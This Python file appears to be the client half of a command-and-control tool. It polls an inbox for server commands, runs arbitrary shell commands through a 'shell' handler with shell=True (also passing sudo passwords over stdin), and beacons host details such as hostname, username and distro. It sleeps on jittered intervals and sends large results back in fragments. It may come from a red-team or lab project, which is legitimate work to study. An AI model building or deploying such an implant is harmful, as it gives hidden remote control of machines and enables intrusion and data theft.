import getpass
import json
import os
import platform
import random
import subprocess
import time
import uuid
from datetime import datetime, timezone

import common

# Default heartbeat interval in poll cycles (overridden by config command)
_DEFAULT_HEARTBEAT_EVERY = 100

# Known config keys and their defaults — all in-memory only, no disk persistence
# cycle_* keys control the client's own sleep between poll cycles.
# These are reported in heartbeats so the server can sync its refresh interval.
_KNOWN_CONFIG_KEYS = {"cycle_interval_sec", "cycle_jitter_min", "cycle_jitter_max", "client_id", "heartbeat_every"}

_client_config = {
    "cycle_interval_sec": "30",
    "cycle_jitter_min":   "5",
    "cycle_jitter_max":   "15",
    "client_id": os.environ.get("CLIENT_ID", "NADAV"),
    "heartbeat_every": str(_DEFAULT_HEARTBEAT_EVERY),
}

# Fragment send queue — in-memory only, lost on restart by design
_send_queue = []


def _get_username():
    try:
        return getpass.getuser()
    except Exception:
        return "unknown"


def _get_distro():
    """Read the actual distro from /etc/os-release (Linux only).
    Necessary because Docker containers share the host kernel — platform.version()
    returns the host kernel string (e.g. 'Kali 6.x') even inside a Debian container.
    distro reflects what is actually installed inside the container/machine.
    """
    try:
        with open("/etc/os-release") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    return line.split("=", 1)[1].strip().strip('"')
    except Exception:
        pass
    return None


def _system_info():
    info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "hostname": platform.node(),
        "python_version": platform.python_version(),
        "architecture": platform.machine(),
        "username": _get_username(),
    }
    distro = _get_distro()
    if distro:
        info["distro"] = distro
    return info


# ---------------------------------------------------------------------------
# Handlers
# ---------------------------------------------------------------------------

def handle_system_info(payload):
    return _system_info()


def handle_echo(payload):
    return payload


def handle_shell(payload):
    cmd = payload.get("cmd", "")
    if not cmd:
        return {"error": "no cmd provided"}

    stdin_data = payload.get("stdin")
    # Safety: if cmd uses sudo -S (reads password from stdin), ignore the stdin field to avoid conflict
    if stdin_data is not None and "| sudo -S" in cmd:
        print("[client] Warning: ignoring stdin field because cmd already contains piped input")
        stdin_data = None

    try:
        if stdin_data is not None:
            proc = subprocess.run(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                input=stdin_data.encode(),
                timeout=30,
            )
        else:
            proc = subprocess.run(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                timeout=30,
            )
        return {
            "stdout": proc.stdout.decode(errors="replace"),
            "stderr": proc.stderr.decode(errors="replace"),
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"error": "command timed out after 30s"}
    except Exception as e:
        return {"error": str(e)}


def handle_config(payload):
    """Update client config with only known keys. In-memory only — resets on restart."""
    updated = {}
    ignored = {}
    for k, v in payload.items():
        if k in _KNOWN_CONFIG_KEYS:
            _client_config[k] = str(v)
            updated[k] = str(v)
        else:
            ignored[k] = v
    if updated:
        print(f"[client] Config updated: {updated}")
    if ignored:
        print(f"[client] Ignored unknown config keys: {list(ignored.keys())}")
    result = {"updated": updated, "current": dict(_client_config)}
    if ignored:
        result["ignored"] = ignored
    return result


HANDLERS = {
    "system_info": handle_system_info,
    "echo": handle_echo,
    "shell": handle_shell,
    "config": handle_config,
}


# ---------------------------------------------------------------------------
# Dispatch
# ---------------------------------------------------------------------------

def dispatch(task):
    command = task.get("command", "")
    try:
        payload = json.loads(task.get("payload") or "{}")
    except json.JSONDecodeError:
        payload = {}

    handler = HANDLERS.get(command)
    if handler is None:
        result_data = {"error": f"unknown command: {command}"}
        status = "error"
    else:
        try:
            result_data = handler(payload)
            status = "success"
        except Exception as e:
            result_data = {"error": str(e)}
            status = "error"

    client_id = _client_config.get("client_id", _get_username())
    result_str = json.dumps(result_data)
    data = {
        "command_id": task["command_id"],
        "client_id": client_id,
        "status": status,
        "result": result_str,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    # Fragment large results — write first chunk now, queue the rest
    fragmenter = common.get_fragmenter()
    chunks = fragmenter.fragment(result_str)
    if len(chunks) > 1:
        frags = common.build_outbox_fragments(data, chunks)
        data["_fragments"] = frags  # carry fragments for main loop to handle

    return data


def send_heartbeat():
    payload = _system_info()
    # Include current cycle timing so the server can sync its refresh interval.
    # See ideas/sync_refresh_interval.md — Option B (heartbeat carries client timing).
    try:
        payload["cycle_interval_sec"] = float(_client_config.get("cycle_interval_sec", 30))
        payload["cycle_jitter_min"]   = float(_client_config.get("cycle_jitter_min",   5))
        payload["cycle_jitter_max"]   = float(_client_config.get("cycle_jitter_max",  15))
    except ValueError:
        pass
    result = {
        "command_id": f"heartbeat-{uuid.uuid4()}",
        "client_id": _client_config.get("client_id", "unknown"),
        "status": "heartbeat",
        "result": json.dumps(payload),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    ok = common.write_form(result)
    if not ok:
        print("[warn] heartbeat write failed")
    else:
        print("[client] Heartbeat sent")


# ---------------------------------------------------------------------------
# Send queue
# ---------------------------------------------------------------------------

def _flush_queued_fragment():
    """Send the next queued fragment, if any. One fragment per call."""
    if not _send_queue:
        return
    frag = _send_queue[0]
    ok = common.write_form(frag)
    if ok:
        _send_queue.pop(0)
        remaining = len(_send_queue)
        print(f"[client] Fragment sent for {frag['command_id']} "
              f"({frag['status']}) — {remaining} remaining in queue")
    else:
        print(f"[warn] Fragment write failed for {frag['command_id']}, will retry next cycle")


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    common.load_env()

    processed = set()
    cycle = 0

    print("[info] client starting — config resets on restart, re-send config command if needed")

    while True:
        # Send heartbeat on startup and every N cycles
        heartbeat_every = int(_client_config.get("heartbeat_every", _DEFAULT_HEARTBEAT_EVERY))
        if cycle == 0 or cycle % heartbeat_every == 0:
            send_heartbeat()

        # Read outbox to rebuild processed set on first cycle
        try:
            outbox = common.read_outbox()
            if not processed:
                processed = {r["command_id"] for r in outbox if "command_id" in r}
                print(f"[info] initialized processed set with {len(processed)} known command(s)")
        except Exception as e:
            print(f"[warn] outbox read failed: {e}")

        # Read inbox
        try:
            inbox = common.read_inbox()
        except Exception as e:
            print(f"[warn] inbox read failed, skipping cycle: {e}")
            inbox = []

        pending = [
            t for t in inbox
            if t.get("status") == "pending" and t.get("command_id") not in processed
        ]

        # Flush one queued fragment before processing new commands
        _flush_queued_fragment()

        if pending:
            print(f"[info] {len(pending)} pending command(s)")

        for task in pending:
            tid = task.get("command_id", "?")
            # Mark processed before executing — if write fails, result is lost
            # but the command will not re-execute on the next cycle or after restart
            processed.add(tid)
            print(f"[info] executing command {tid} ({task.get('command')})")
            result = dispatch(task)
            frags = result.pop("_fragments", None)

            if frags:
                ok = common.write_form(frags[0])
                if ok:
                    if len(frags) > 1:
                        _send_queue.extend(frags[1:])
                        print(f"[info] command {tid}: fragment 0/{len(frags)-1} sent, "
                              f"{len(frags)-1} queued")
                    else:
                        print(f"[info] command {tid} done (single fragment)")
                else:
                    print(f"[warn] command {tid} fragment 0 write failed — result lost")
            else:
                ok = common.write_form(result)
                if ok:
                    print(f"[info] command {tid} done, result written")
                else:
                    print(f"[warn] command {tid} result write failed — result lost")

        # Sleep using current _client_config (may have been updated by a config command)
        try:
            interval   = float(_client_config.get("cycle_interval_sec", 30))
            jitter_min = float(_client_config.get("cycle_jitter_min",    5))
            jitter_max = float(_client_config.get("cycle_jitter_max",   15))
        except ValueError:
            interval, jitter_min, jitter_max = 30, 5, 15

        sleep_sec = interval + random.uniform(jitter_min, jitter_max)
        print(f"[info] sleeping {sleep_sec:.1f}s")
        time.sleep(sleep_sec)
        cycle += 1


if __name__ == "__main__":
    main()
